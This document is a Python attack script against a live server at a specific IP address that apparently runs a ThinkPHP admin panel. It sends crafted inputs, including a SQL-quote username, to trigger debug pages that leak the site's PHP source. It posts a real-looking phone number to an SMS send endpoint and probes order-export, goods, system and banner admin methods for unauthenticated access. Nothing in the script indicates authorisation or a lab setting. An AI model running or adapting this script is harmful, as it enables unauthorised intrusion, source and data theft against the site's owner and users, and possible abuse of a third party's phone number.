#!/usr/bin/env python3
"""tp_focus2.py - 深挖Login/send + Order导出 + 全部方法源码滚动"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def get(url):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=10, context=ctx)
        return r.status, r.read(200000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def post(url, data):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
            headers={**UA, "Content-Type": "application/x-www-form-urlencoded"}), timeout=10, context=ctx)
        return r.status, r.read(200000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def leak_lines(b):
    lines = {}
    for m in re.finditer(r'<li class="line-(\d+)"><code>(.*?)</code></li>', b, re.S):
        lines[int(m.group(1))] = re.sub(r'<[^>]+>', '', m.group(2))
    return lines

print("=== 1. Login控制器源码(公开, 找send逻辑) ===", flush=True)
# Login是公开控制器, 通过错误触发源码
st, b = post(BASE + "/admin/login/send.html", {"phone": "15922560065"})
l = leak_lines(b)
if l:
    for ln in sorted(l):
        print("  %4d: %s" % (ln, l[ln][:120]), flush=True)
else:
    print("  no leak, st=%d size=%d %s" % (st, len(b), b[:120]), flush=True)

print("\n=== 2. Login.php登录方法源码 ===", flush=True)
st, b = post(BASE + "/admin/login/login.html", {"name": "admin'", "pwd": "x"})
l = leak_lines(b)
if l:
    for ln in sorted(l):
        print("  %4d: %s" % (ln, l[ln][:120]), flush=True)

print("\n=== 3. Order/daochuExcel 无鉴权? ===", flush=True)
for m in ["daochuExcel", "dcHt2", "orderRead", "orderInfo", "getList", "addOrder"]:
    st, b = get(BASE + "/admin/order/%s.html" % m)
    l = leak_lines(b)
    if l:
        biz = [ln for ln in l if "function" in l[ln] or "input(" in l[ln] or "where" in l[ln] or "model" in l[ln]]
        if biz:
            print("  %s: LEAKED %d lines (biz: %s)" % (m, len(l), biz[:3]), flush=True)
            for ln in sorted(biz)[:8]:
                print("    %4d: %s" % (ln, l[ln][:110]), flush=True)
    elif "variable type error" in b:
        print("  %s: array-error (EXECUTED without auth!)" % m, flush=True)
    else:
        print("  %s: st=%d size=%d %s" % (m, st, len(b), "LOGIN" if "跳转" in b else ""), flush=True)

print("\n=== 4. Goods/Product/System方法 ===", flush=True)
for ctrl, ms in [("goods", ["getList", "goodsUpField", "edit"]),
                 ("product", ["index", "productAddUp"]),
                 ("system", ["update", "updateStatus", "index"]),
                 ("brand", ["getList", "getSelect"]),
                 ("banner", ["bannerInt", "bannerAddUp", "bannerDel"])]:
    for m in ms:
        st, b = get(BASE + "/admin/%s/%s.html" % (ctrl, m))
        l = leak_lines(b)
        if l and any("public function" in v for v in l.values()):
            fns = [ln for ln in l if "function" in l[ln]]
            print("  %s/%s: LEAKED (fn@%s)" % (ctrl, m, fns[:2]), flush=True)
        elif "variable type error" in b:
            print("  %s/%s: EXECUTED-noauth (array-error)" % (ctrl, m), flush=True)
        elif st == 200 and len(b) > 100 and "跳转" not in b and "System Error" not in b:
            print("  %s/%s: DATA? st=%d size=%d body=%s" % (ctrl, m, st, len(b), b[:150]), flush=True)
print("=== DONE ===", flush=True)
